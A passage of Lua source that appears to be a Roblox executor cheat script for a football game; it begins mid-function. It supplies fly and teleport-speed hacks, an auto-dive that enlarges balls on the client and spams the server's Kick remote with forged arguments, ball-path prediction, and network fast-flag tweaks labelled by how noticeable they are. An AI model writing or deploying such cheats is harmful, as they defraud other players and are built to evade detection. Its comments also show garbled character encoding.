            local hrp  = char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
            local hum  = char:FindFirstChild("Humanoid"); if not hum then return end
            if hum.MoveDirection.Magnitude < 0.1 then return end
            hrp.CFrame = hrp.CFrame + hum.MoveDirection * tpSpeed
        end)
    else
        if tpConn then tpConn:Disconnect(); tpConn = nil end
    end
end)
TabMove:CreateSlider("TP Speed (1â€“12)", 0.1, 0.5, 0.1, function(v) tpSpeed = v end)

TabMove:CreateSection("Fly")
local flyEnabled = false; local flySpeed = 29; local flyConn = nil; local flyBV = nil
local function flyCleanup()
    if flyBV then pcall(function() flyBV:Destroy() end); flyBV = nil end
    pcall(function()
        local hum = lp.Character and lp.Character:FindFirstChild("Humanoid")
        if hum then hum.PlatformStand = false end
    end)
end
TabMove:CreateToggle("Fly", "Fly freely", false, function(v)
    flyEnabled = v
    if v then
        if flyConn then flyConn:Disconnect() end
        flyConn = RunService.Heartbeat:Connect(function()
            if not flyEnabled then flyCleanup(); return end
            local char = lp.Character; if not char then return end
            local hrp  = char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
            local hum  = char:FindFirstChild("Humanoid"); if not hum then return end
            hum.PlatformStand = true
            if not flyBV or not flyBV.Parent then
                flyBV = Instance.new("BodyVelocity", hrp); flyBV.MaxForce = V3(1e5,1e5,1e5)
            end
            local move    = hum.MoveDirection
            local upVec   = UIS:IsKeyDown(Enum.KeyCode.Space) and V3(0,1,0) or Vector3.zero
            local downVec = (UIS:IsKeyDown(Enum.KeyCode.LeftControl) or UIS:IsKeyDown(Enum.KeyCode.RightControl)) and V3(0,-1,0) or Vector3.zero
            local dir     = (move.Magnitude > 0.1 and move or Vector3.zero) + upVec + downVec
            flyBV.Velocity = dir.Magnitude > 0 and dir.Unit * flySpeed or Vector3.zero
        end)
    else
        flyCleanup(); if flyConn then flyConn:Disconnect(); flyConn = nil end
    end
end)
TabMove:CreateSlider("Fly Speed (10â€“120)", 10, 32, 40, function(v) flySpeed = v end)

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  GK  â€”  Directional Auto Dive (Movement-Based)
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
local RunService = game:GetService("RunService")
local Players    = game:GetService("Players")
local RepStorage = game:GetService("ReplicatedStorage")
local lp         = Players.LocalPlayer

local ANIM_HEADER = "rbxassetid://83669895507175"
local ANIM_BACK   = "rbxassetid://133843606757895"
local ANIM_RIGHT  = "rbxassetid://130737929982335"
local ANIM_LEFT   = "rbxassetid://97298506180835"

local DIVE_RANGE  = 40
local DIVE_SPEED  = 45
local DIVE_LIFT   = 28
local COOLDOWN    = 0.2
local HIT_RADIUS  = 6

local onCooldown       = false
local animPlaying      = false
local liveTrack        = nil
local touchCD          = false
local gkAutoDiveEnabled = false

local function inBox()
    local gui = lp:FindFirstChild("PlayerGui")
    if not gui then return false end
    local main = gui:FindFirstChild("Main")
    if not main then return false end
    local values = main:FindFirstChild("Values")
    if not values then return false end
    local goalie = values:FindFirstChild("Goalie")
    if not goalie then return false end
    return goalie.Value == true
end

local function getKickRemote()
    local r = RepStorage:FindFirstChild("Remotes")
    r = r and r:FindFirstChild("Game")
    r = r and r:FindFirstChild("Touch")
    r = r and r:FindFirstChild("Kick")
    return r
end

local function getAllBalls()
    local folder = workspace:FindFirstChild("Footballs")
    if not folder then return {} end
    local balls = {}
    for _, obj in ipairs(folder:GetChildren()) do
        local part = obj:IsA("BasePart") and obj or obj:FindFirstChildWhichIsA("BasePart")
        if part then table.insert(balls, part) end
    end
    return balls
end

local function getMostDangerousBall()
    local char = lp.Character; if not char then return nil, math.huge end
    local hrp  = char:FindFirstChild("HumanoidRootPart"); if not hrp then return nil, math.huge end
    local balls = getAllBalls()
    if #balls == 0 then return nil, math.huge end

    local bestBall, bestScore, bestDist = nil, -math.huge, math.huge

    for _, ball in ipairs(balls) do
        local toPlayer = hrp.Position - ball.Position
        local dist     = toPlayer.Magnitude
        if dist > DIVE_RANGE then continue end

        local vel   = ball.AssemblyLinearVelocity
        local speed = vel.Magnitude
        local approachFactor = 0
        if speed > 1 and dist > 0 then
            approachFactor = vel.Unit:Dot(toPlayer.Unit)
        end

        local score = (approachFactor * speed) + (1 / math.max(dist, 1)) * 10
        if score > bestScore then
            bestScore = score; bestBall = ball; bestDist = dist
        end
    end

    if not bestBall then
        local minDist = math.huge
        for _, ball in ipairs(balls) do
            local d = (ball.Position - hrp.Position).Magnitude
            if d < minDist then minDist = d; bestBall = ball; bestDist = d end
        end
    end

    return bestBall, bestDist
end

local function pickDive(hrp, ballPos)
    local lpos = hrp.CFrame:PointToObjectSpace(ballPos)
    if lpos.Y > 4 then
        return ANIM_HEADER, { Right = false, Ground = false, Left = false }
    end
    if math.abs(lpos.X) >= math.abs(lpos.Z) then
        if lpos.X > 0 then
            return ANIM_RIGHT, { Right = true,  Ground = false, Left = false }
        else
            return ANIM_LEFT,  { Right = false, Ground = false, Left = true  }
        end
    else
        if lpos.Z < 0 then
            return ANIM_HEADER, { Right = false, Ground = false, Left = false }
        else
            return ANIM_BACK,   { Right = false, Ground = false, Left = false }
        end
    end
end

local function reachTouchAll()
    for _, ball in ipairs(getAllBalls()) do
        local origSize    = ball.Size
        local origCollide = ball.CanCollide
        pcall(function()
            ball.Size       = Vector3.new(10, 10, 10)
            ball.CanCollide = false
        end)
        task.delay(0.18, function()
            pcall(function()
                if ball and ball.Parent then
                    ball.Size       = origSize
                    ball.CanCollide = origCollide
                end
            end)
        end)
    end
end

local function fireAllKicks(hrp, flags)
    local remote = getKickRemote()
    if not remote then return end
    local cf = CFrame.new(hrp.Position, hrp.Position + hrp.CFrame.LookVector)
    for _, ball in ipairs(getAllBalls()) do
        local args = {
            {
                ball,
                "Dive",
                1,
                flags,
                cf,
                Vector3.zero
            }
        }
        pcall(function()
            remote:FireServer(unpack(args))
        end)
    end
end

local function stopAnim()
    if liveTrack then pcall(function() liveTrack:Stop() end); liveTrack = nil end
    animPlaying = false
end

local function playAnim(char, animId)
    stopAnim()
    local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
    animPlaying = true
    local anim = Instance.new("Animation")
    anim.AnimationId = animId
    local track = hum:LoadAnimation(anim)
    liveTrack = track
    track:Play()
    track.Stopped:Connect(function()
        animPlaying = false; liveTrack = nil
        pcall(function() anim:Destroy() end)
    end)
    task.delay(4, function()
        if liveTrack == track then stopAnim(); pcall(function() anim:Destroy() end) end
    end)
end

local function doDive(ball)
    if onCooldown or animPlaying then return end
    local char = lp.Character;                            if not char then return end
    local hrp  = char:FindFirstChild("HumanoidRootPart"); if not hrp  then return end

    onCooldown = true

    local ballPos       = ball.Position
    local animId, flags = pickDive(hrp, ballPos)

    local flat = Vector3.new(ballPos.X - hrp.Position.X, 0, ballPos.Z - hrp.Position.Z)
    if flat.Magnitude < 0.01 then flat = hrp.CFrame.LookVector * Vector3.new(1, 0, 1) end
    flat = flat.Unit

    local launchVel = flat * DIVE_SPEED + Vector3.new(0, DIVE_LIFT, 0)

    hrp.AssemblyLinearVelocity = launchVel
    local frames = 0; local pushConn
    pushConn = RunService.Heartbeat:Connect(function()
        frames += 1
        if frames <= 3 then
            pcall(function() hrp.AssemblyLinearVelocity = launchVel end)
        else
            pushConn:Disconnect()
        end
    end)

    playAnim(char, animId)

    for _, t in ipairs({ 0.08, 0.22, 0.38, 0.52 }) do
        task.delay(t, function() reachTouchAll() end)
    end

    local loopStart = tick()
    local loopConn
    loopConn = RunService.PreSimulation:Connect(function()
        local h = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
        if not h then loopConn:Disconnect(); return end

        for _, b in ipairs(getAllBalls()) do
            if (b.Position - h.Position).Magnitude < 5 then
                loopConn:Disconnect()
                return
            end
        end

        if tick() - loopStart >= 3.5 then
            loopConn:Disconnect()
            return
        end

        fireAllKicks(h, flags)
    end)

    task.delay(COOLDOWN, function() onCooldown = false end)
end

-- â”€â”€â”€ UI â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
TabGK:CreateSection("Auto Dive")
TabGK:CreateToggle("Enable Auto Dive", "Dives when Goalie value is active (in box)", true, function(v)
    gkAutoDiveEnabled = v
    if not v then stopAnim() end
end)
TabGK:CreateSlider("Dive Range (10â€“60)", 10, 60, DIVE_RANGE, function(v) DIVE_RANGE = v end)
TabGK:CreateSlider("Dive Speed (20â€“100)", 20, 100, DIVE_SPEED, function(v) DIVE_SPEED = v end)
TabGK:CreateSlider("Dive Lift (5â€“50)", 5, 50, DIVE_LIFT, function(v) DIVE_LIFT = v end)
TabGK:CreateSlider("Cooldown (0â€“3s)", 0, 3, COOLDOWN, function(v) COOLDOWN = v end)
TabGK:CreateSlider("Hit Radius (2â€“15)", 2, 15, HIT_RADIUS, function(v) HIT_RADIUS = v end)

-- â”€â”€â”€ Heartbeat â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
RunService.Heartbeat:Connect(function()
    if not inBox() then return end

    local char = lp.Character;                            if not char then return end
    local hrp  = char:FindFirstChild("HumanoidRootPart"); if not hrp  then return end

    local ball, dist = getMostDangerousBall()
    if not ball then return end

    if dist < 4.5 and not touchCD then
        touchCD = true
        reachTouchAll()
        task.delay(0.08, function() touchCD = false end)
    end

    if not onCooldown and not animPlaying and dist <= HIT_RADIUS then
        doDive(ball)
    end
end)

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  PREDICTION
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-- ============================================================
--  PREDICTION TAB â€“ punishgoat UI (bulletproof)
--  Core logic unchanged. Extras are optional and safe.
-- ============================================================
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  PREDICTION
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
TabPred:CreateSection("Ball Prediction Lines")
TabPred:CreateParagraph("How it works",
    "Tracks every ball in workspace.Footballs within range.\n"..
    "GREEN line = you can reach it.\n"..
    "RED line   = too far.\n"..
    "Yellow sphere = predicted landing spot.")

local PRED_RANGE   = 20
local PRED_TOUCH   = 6
local PRED_GRAVITY = -98.1
local PRED_TIME    = 1.4

local predOn       = false
local predObjs     = {}

local function makePredBeam(ball)
    local folder = workspace:FindFirstChild("_PredViz")
    if not folder then folder = Instance.new("Folder"); folder.Name="_PredViz"; folder.Parent=workspace end

    local a0 = Instance.new("Attachment"); a0.Parent = workspace.Terrain
    local a1 = Instance.new("Attachment"); a1.Parent = workspace.Terrain

    local beam = Instance.new("Beam")
    beam.Attachment0      = a0
    beam.Attachment1      = a1
    beam.Width0           = 0.14
    beam.Width1           = 0.14
    beam.FaceCamera       = true
    beam.LightInfluence   = 0
    beam.Transparency     = NumberSequence.new(0.15)
    beam.Parent           = folder

    local sphere = Instance.new("Part")
    sphere.Anchored    = true
    sphere.CanCollide  = false
    sphere.Shape       = Enum.PartType.Ball
    sphere.Size        = V3(0.6, 0.6, 0.6)
    sphere.Material    = Enum.Material.Neon
    sphere.Color       = Color3.fromRGB(255, 220, 0)
    sphere.Transparency= 0.25
    sphere.CFrame      = CFrame.new(0, -9999, 0)
    sphere.Parent      = folder

    predObjs[ball] = {beam=beam, a0=a0, a1=a1, sphere=sphere}
end

local function cleanPredObjs()
    for _, t in pairs(predObjs) do
        pcall(function() t.beam:Destroy() end)
        pcall(function() t.a0:Destroy() end)
        pcall(function() t.a1:Destroy() end)
        pcall(function() t.sphere:Destroy() end)
    end
    predObjs = {}
    local f = workspace:FindFirstChild("_PredViz")
    if f then f:Destroy() end
end

local function simulateLanding(pos, vel)
    local px, py, pz = pos.X, pos.Y, pos.Z
    local vx, vy, vz = vel.X, vel.Y, vel.Z
    local dt = 0.03; local steps = math.floor(PRED_TIME / dt)
    for _ = 1, steps do
        vy = vy + PRED_GRAVITY * dt * dt
        px = px + vx * dt
        py = py + vy * dt
        pz = pz + vz * dt
        if py <= 1 then py = 1; break end
    end
    return V3(px, py, pz)
end

local predConn = nil
local cachedPingGlobal = 0.06

local function startPred()
    if predConn then predConn:Disconnect() end
    predConn = RunService.Heartbeat:Connect(function()
        if not predOn then return end
        local char = lp.Character
        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local folder = getFootballFolder()

        for ball in pairs(predObjs) do
            if not ball or not ball.Parent then
                pcall(function()
                    local t = predObjs[ball]
                    if t then
                        pcall(function() t.beam:Destroy() end)
                        pcall(function() t.a0:Destroy() end)
                        pcall(function() t.a1:Destroy() end)
                        pcall(function() t.sphere:Destroy() end)
                    end
                end)
                predObjs[ball] = nil
            end
        end

        if not folder then return end

        for _, ball in folder:GetChildren() do
            if ball:IsA("BasePart") then
                local dist = (ball.Position - hrp.Position).Magnitude
                if dist <= PRED_RANGE then
                    if not predObjs[ball] then makePredBeam(ball) end
                    local t = predObjs[ball]
                    local vel     = ball.AssemblyLinearVelocity
                    local landing = simulateLanding(ball.Position, vel)

                    local predPos = V3(
                        ball.Position.X + vel.X * cachedPingGlobal,
                        ball.Position.Y + vel.Y * cachedPingGlobal,
                        ball.Position.Z + vel.Z * cachedPingGlobal
                    )
                    local reachable = (predPos - hrp.Position).Magnitude < PRED_TOUCH

                    local col = reachable
                        and Color3.fromRGB(0, 255, 80)
                        or  Color3.fromRGB(255, 40, 40)

                    t.beam.Color = ColorSequence.new(col)
                    t.a0.WorldPosition = ball.Position
                    t.a1.WorldPosition = landing
                    t.sphere.CFrame    = CFrame.new(landing)
                else
                    if predObjs[ball] then
                        local t = predObjs[ball]
                        pcall(function() t.a0.WorldPosition = V3(0,-9999,0) end)
                        pcall(function() t.a1.WorldPosition = V3(0,-9999,0) end)
                        pcall(function() t.sphere.CFrame = CFrame.new(0,-9999,0) end)
                    end
                end
            end
        end
    end)
end

RunService.Heartbeat:Connect(function()
    pcall(function() cachedPingGlobal = clamp(lp:GetNetworkPing(), 0.008, 0.30) end)
end)

TabPred:CreateButton("Toggle Prediction ON / OFF", "Draws lines + landing sphere per ball", nil, function()
    predOn = not predOn
    if predOn then
        startPred()
        punishgoatby97mzu:Notify({Title="Prediction", Content="ON â€” green=reachable red=too far", Duration=3})
    else
        cleanPredObjs()
        if predConn then predConn:Disconnect(); predConn=nil end
        punishgoatby97mzu:Notify({Title="Prediction", Content="OFF", Duration=2})
    end
end)
TabPred:CreateSlider("Reachable Threshold (2â€“12)", 2, 12, 6, function(v) PRED_TOUCH = v end)
TabPred:CreateSlider("Track Range (5â€“40)", 5, 40, 20, function(v) PRED_RANGE = v end)
TabPred:CreateSlider("Predict Ahead (0.5â€“3s Ã—10)", 5, 30, 14, function(v) PRED_TIME = v / 10 end)
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  REACT TAB (CLEAN - ONLY PERCENTAGES)
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
local _reactActive = false
local _reactThread = nil
local _lastReactTT, _lastReactInterp = "13", "90"

local function applyReact(tt, interp)
    _lastReactTT = tt; _lastReactInterp = interp
    local function strip(k)
        return k:gsub("^DFInt",""):gsub("^DFFlag",""):gsub("FString",""):gsub("FLog",""):gsub("^FFlag",""):gsub("^DFint",""):gsub("^FInt","")
    end
    if _reactThread then task.cancel(_reactThread); _reactThread = nil end
    if not _reactActive then return end
    local flags = {
        ["DFIntTargetTimeDelayFacctorTenths"] = tt,
        ["FIntInterpolationMaxDelayMSec"]     = interp,
    }
    _reactThread = task.spawn(function()
        local function apply()
            if not setfflag then return end
            for k, v in pairs(flags) do
                local ck = strip(k)
                pcall(function()
                    if getfflag(ck)~=nil then setfflag(ck,v)
                    elseif getfflag(k)~=nil then setfflag(k,v) end
                end)
            end
        end
        while true do apply(); task.wait(20) end
    end)
end

TabReact:CreateSection("React")
TabReact:CreateLabel("Enable first, then pick level.")
TabReact:CreateToggle("Enable React", "activates react", false, function(v)
    _reactActive = v
    if not v then
        if _reactThread then task.cancel(_reactThread); _reactThread = nil end
    else
        applyReact(_lastReactTT, _lastReactInterp)
    end
end)
TabReact:CreateButton("React 15%  â€” not obv at all", "safest react level",     nil, function() applyReact("13","90") end)
TabReact:CreateButton("React 25%  â€” not obv",        "light react",            nil, function() applyReact("12","85") end)
TabReact:CreateButton("React 50%  â€” balanced",        "mid react",             nil, function() applyReact("10","75") end)
TabReact:CreateButton("React 75%  â€” Aggressive",      "high react",            nil, function() applyReact("8","67")  end)
TabReact:CreateButton("React 100% â€” Maximum",         "max react, noticeable", nil, function() applyReact("6","70")  end)
TabReact:CreateDivider()
TabReact:CreateSection("Note")
TabReact:CreateParagraph("React vs Moss", "made by cezar.\ngotta fill ts cuz of ui.\nyes hi")
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

local _gkReactActive = false
local _gkReactThread = nil
local _lastGkReactTT, _lastGkReactInterp = "13", "90"

local function applyGkReact(tt, interp)
    _lastGkReactTT = tt; _lastGkReactInterp = interp
    local function strip(k)
        return k:gsub("^DFInt",""):gsub("^DFFlag",""):gsub("FString",""):gsub("FLog",""):gsub("^FFlag",""):gsub("^DFint",""):gsub("^FInt","")
    end
    if _gkReactThread then task.cancel(_gkReactThread); _gkReactThread = nil end
    if not _gkReactActive then return end
    local flags = {
        ["DFIntTargetTimeDelayFacctorTenths"] = tt,
        ["FIntInterpolationMaxDelayMSec"]    = interp,
    }
    _gkReactThread = task.spawn(function()
        local function apply()
            if not setfflag then return end
            for k, v in pairs(flags) do
                local ck = strip(k)
                pcall(function()
                    if getfflag(ck)~=nil then setfflag(ck,v)
                    elseif getfflag(k)~=nil then setfflag(k,v) end
                end)
            end
        end
        while true do apply(); task.wait(20) end
    end)
end

TabGKReact:CreateSection("GK React")
TabGKReact:CreateLabel("Enable first, then pick level.")
TabGKReact:CreateToggle("Enable GK React", " gk react", false, function(v)
    _gkReactActive = v
    if not v then
        if _gkReactThread then task.cancel(_gkReactThread); _gkReactThread = nil end
    else
        applyGkReact(_lastGkReactTT, _lastGkReactInterp)
    end
end)
TabGKReact:CreateButton("GK React 15%  â€” not obv at all", "safest gk react level",     nil, function() applyGkReact("13","90") end)
TabGKReact:CreateButton("GK React 25%  â€” not obv",         "light gk react",            nil, function() applyGkReact("12","85") end)
TabGKReact:CreateButton("GK React 50%  â€” balanced",        "mid gk react",              nil, function() applyGkReact("10","75") end)
TabGKReact:CreateButton("GK React 75%  â€” Aggressive",      "high gk react",             nil, function() applyGkReact("8","67")  end)
TabGKReact:CreateButton("GK React 100% â€” Maximum",         "max gk react, noticeable", nil, function() applyGkReact("6","70")  end)
TabGKReact:CreateDivider()
TabGKReact:CreateSection("Note")
TabGKReact:CreateParagraph("")





--  FLAGS TAB (FULLY INTACT)
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

-- helper: strips prefix so both "DFIntXxx" and "Xxx" forms work
local function sf(k, v)
    if not setfflag then return end
    local ck = k:gsub("^DFInt",""):gsub("^DFFlag",""):gsub("^FFlagDebug","FFlagDebug"):gsub("^FString",""):gsub("^FLog",""):gsub("^FFlag",""):gsub("^DFint",""):gsub("^FInt","")
    pcall(function()
        if getfflag and getfflag(ck) ~= nil then setfflag(ck, v)
        else setfflag(k, v) end
    end)
end

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  PRESETS
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
TabFlags:CreateSection(" Presets")
TabFlags:CreateLabel("One click â€” applies a full set of flags instantly.")

-- Low End / Max FPS
TabFlags:CreateButton("Low End PC  (max fps, bare visuals)", "kills shadows, postfx, textures, unlocks fps", nil, function()
    sf("DFIntTaskSchedulerTargetFps",               "9999")
    sf("FFlagTaskSchedulerLimitTargetFpsTo2402",     "true")
    sf("FFlagDebugDisplayFPS",                       "false")
    sf("FFlagDebugSkyGray",                          "true")
    sf("FIntDebugForceMSAASamples",                  "0")
    sf("DFFlagTextureQualityOverrideEnabled",        "true")
    sf("DFIntTextureQualityOverride",                "0")
    sf("FIntDebugTextureManagerSkipMips",            "2")
    sf("FIntRenderShadowIntensity",                  "0")
    sf("FFlagDisablePostFx",                         "true")
    sf("FIntTerrainArraySliceSize",                  "4")
    sf("DFFlagDebugRenderForceTechnologyVoxel",      "true")
    sf("DFFlagDebugRenderForceFutureIsBrightPhase2", "false")
    sf("DFFlagDebugRenderForceFutureIsBrightPhase3", "false")
    sf("FIntRenderLocalLightUpdatesMax",             "1")
    sf("FIntRenderLocalLightUpdatesMin",             "1")
    sf("FIntRenderMaxManagingLightEntities",         "10")
    sf("FIntRenderMaxSimultaneousLights",            "2")
    sf("DFIntMaxFrameBufferSize",                    "1")
    sf("DFIntAvatarLODDecimationGain",               "100")
    sf("FIntLodAvatarMinThreshold",                  "1")
    sf("DFIntCSGLevelOfDetailSwitchingDistance",     "4")
    sf("DFIntCSGLevelOfDetailSwitchingDistanceL12",  "4")
    sf("DFIntCSGLevelOfDetailSwitchingDistanceL23",  "4")
    sf("DFIntCSGLevelOfDetailSwitchingDistanceL34",  "4")
    punishgoatby97mzu:Notify({ Title="Preset", Content="Low End PC applied.", Duration=3 })
end)

-- High FPS (good PC)
TabFlags:CreateButton("High FPS  (uncapped, keep quality)", "unlocks fps without trashing visuals", nil, function()
    sf("DFIntTaskSchedulerTargetFps",               "9999")
    sf("FFlagTaskSchedulerLimitTargetFpsTo2402",     "true")
    sf("FFlagDisablePostFx",                         "false")
    sf("FIntRenderShadowIntensity",                  "1")
    sf("DFFlagTextureQualityOverrideEnabled",        "false")
    sf("FIntDebugForceMSAASamples",                  "0")
    punishgoatby97mzu:Notify({ Title="Preset", Content="High FPS applied.", Duration=3 })
end)

-- Anti-Lag (network focused)
TabFlags:CreateButton("Anti-Lag  (network + hitreg)", "best network flags for low latency", nil, function()
    sf("DFIntTargetTimeDelayFacctorTenths",          "12")
    sf("FIntInterpolationMaxDelayMSec",              "8")
    sf("DFIntS2PhysicsSenderRate",                   "90")
    sf("DFIntConnectionMTUSize",                     "900")
    sf("DFIntRakNetResendBufferArrayLength",         "128")
    sf("FFlagOptimizeNetwork",                       "true")
    sf("DFIntCodecMaxIncomingPackets",               "64")
    sf("DFIntRakNetLoopMs",                          "16")
    sf("DFIntPhysicsReceiveNumSimulationResultsMultiplier", "32")
    sf("DFIntMaxUnreliableMessageSizeKB",            "64")
    punishgoatby97mzu:Notify({ Title="Preset", Content="Anti-Lag applied.", Duration=3 })
end)

-- Clean Visuals (no clutter)
TabFlags:CreateButton("Clean Visuals  (no shadows/postfx/sky)", "minimal distractions", nil, function()
    sf("FFlagDebugSkyGray",                          "true")
    sf("FIntRenderShadowIntensity",                  "0")
    sf("FFlagDisablePostFx",                         "true")
    sf("FIntDebugForceMSAASamples",                  "0")
    sf("DFFlagDebugRenderForceTechnologyVoxel",      "true")
    sf("DFFlagDebugRenderForceFutureIsBrightPhase2", "false")
    sf("DFFlagDebugRenderForceFutureIsBrightPhase3", "false")
    sf("FIntGlobalShadowsLightInfluence",            "0")
    punishgoatby97mzu:Notify({ Title="Preset", Content="Clean Visuals applied.", Duration=3 })
end)

-- Max Quality
TabFlags:CreateButton("Max Quality  (high-end, looks best)", "best visuals, no fps tricks", nil, function()
    sf("DFIntTaskSchedulerTargetFps",               "60")
    sf("FFlagTaskSchedulerLimitTargetFpsTo2402",     "false")
    sf("FFlagDebugSkyGray",                          "false")
    sf("FIntDebugForceMSAASamples",                  "8")
    sf("DFFlagTextureQualityOverrideEnabled",        "true")
    sf("DFIntTextureQualityOverride",                "4")
    sf("FIntDebugTextureManagerSkipMips",            "0")
    sf("FIntRenderShadowIntensity",                  "100")
    sf("FFlagDisablePostFx",                         "false")
    sf("FIntTerrainArraySliceSize",                  "2")
    sf("DFFlagDebugRenderForceFutureIsBrightPhase3", "true")
    sf("DFFlagDebugRenderForceTechnologyVoxel",      "false")
    sf("DFFlagDebugRenderForceFutureIsBrightPhase2", "false")
    sf("FIntRenderLocalLightUpdatesMax",             "8")
    sf("FIntRenderLocalLightUpdatesMin",             "3")
    sf("FIntRenderMaxManagingLightEntities",         "500")
    sf("FIntRenderMaxSimultaneousLights",            "8")
    punishgoatby97mzu:Notify({ Title="Preset", Content="Max Quality applied.", Duration=3 })
end)

-- Full Bloxstrap Hitreg
TabFlags:CreateButton("Full Bloxstrap Hitreg Fix  (all 25 flags)", "applies the complete bloxstrap network preset", nil, function()
    sf("DFIntTargetTimeDelayFacctorTenths",                         "0")
    sf("DFIntNumClientsIsNearThreshold",                            "10")
    sf("DFIntTaskSchedulerTargetFps",                               "9999")
    sf("FFlagOptimizeNetwork",                                       "true")
    sf("DFIntOptimizeNetworkPacketsByValue",                        "1")
    sf("DFIntConnectionMTUSize",                                    "900")
    sf("DFIntRakNetResendBufferArrayLength",                        "128")
    sf("DFIntRakNetLoopMs",                                         "16")
    sf("DFIntCodecMaxIncomingPackets",                              "64")
    sf("DFIntPhysicsReceiveNumSimulationResultsMultiplier",         "32")
    sf("DFIntPhysicsPacketCacheSize",                               "128")
    sf("DFIntNetworkRunServiceHeartbeatWaitMs",                     "0")
    sf("DFIntSimSendDataBufferTargetSize",                          "32")
    sf("DFIntS2PhysicsSenderRate",                                  "90")
    sf("FIntInterpolationMaxDelayMSec",                             "8")
    sf("DFIntMaxUnreliableMessageSizeKB",                           "64")
    sf("DFIntMaxMissedWorldStepsRemembered",                        "10")
    sf("FFlagDisableCSGLevelOfDetail",                              "true")
    sf("DFIntCSGLevelOfDetailSwitchingDistance",                    "4")
    sf("DFIntCSGLevelOfDetailSwitchingDistanceL12",                 "4")
    sf("DFIntCSGLevelOfDetailSwitchingDistanceL23",                 "4")
    sf("DFIntCSGLevelOfDetailSwitchingDistanceL34",                 "4")
    sf("DFIntHttpCurlConnectionTimeout",                            "5")
    sf("FFlagReplicationDataLimitedBandwidth",                      "false")
    sf("DFIntAnimationLodFacsDistanceMin",                          "0")
    punishgoatby97mzu:Notify({ Title="Preset", Content="Bloxstrap Hitreg applied.", Duration=3 })
end)

TabFlags:CreateDivider()

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  PERFORMANCE â€” TYPABLE
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
TabFlags:CreateSection(" Performance")

TabFlags:CreateInput("Target FPS",                   "set FPS limit (9999 = uncapped)",              "e.g. 9999",  nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntTaskSchedulerTargetFps",tostring(n)); if setfpscap then pcall(setfpscap,n) end end end)
TabFlags:CreateInput("FPS Cap Above 240",            "true/false â€” unlocks above 240",               "true / false", nil, nil, function(v) sf("FFlagTaskSchedulerLimitTargetFpsTo2402", v) end)
TabFlags:CreateInput("Max Frame Buffer Size",         "lower = less input lag (1â€“4)",                 "e.g. 1",     nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntMaxFrameBufferSize",tostring(n)) end end)
TabFlags:CreateInput("Local Light Updates Max",       "max lights updated per frame",                 "e.g. 1",     nil, nil, function(v) local n=tonumber(v) if n then sf("FIntRenderLocalLightUpdatesMax",tostring(n)) end end)
TabFlags:CreateInput("Local Light Updates Min",       "min lights updated per frame",                 "e.g. 1",     nil, nil, function(v) local n=tonumber(v) if n then sf("FIntRenderLocalLightUpdatesMin",tostring(n)) end end)
TabFlags:CreateInput("Max Managing Light Entities",   "total light entities rendered",                "e.g. 10",    nil, nil, function(v) local n=tonumber(v) if n then sf("FIntRenderMaxManagingLightEntities",tostring(n)) end end)
TabFlags:CreateInput("Max Simultaneous Lights",       "hard cap on simultaneous lights",              "e.g. 2",     nil, nil, function(v) local n=tonumber(v) if n then sf("FIntRenderMaxSimultaneousLights",tostring(n)) end end)
TabFlags:CreateInput("Avatar LOD Decimation Gain",    "higher = more aggressive LOD (0â€“100)",         "e.g. 100",   nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntAvatarLODDecimationGain",tostring(n)) end end)
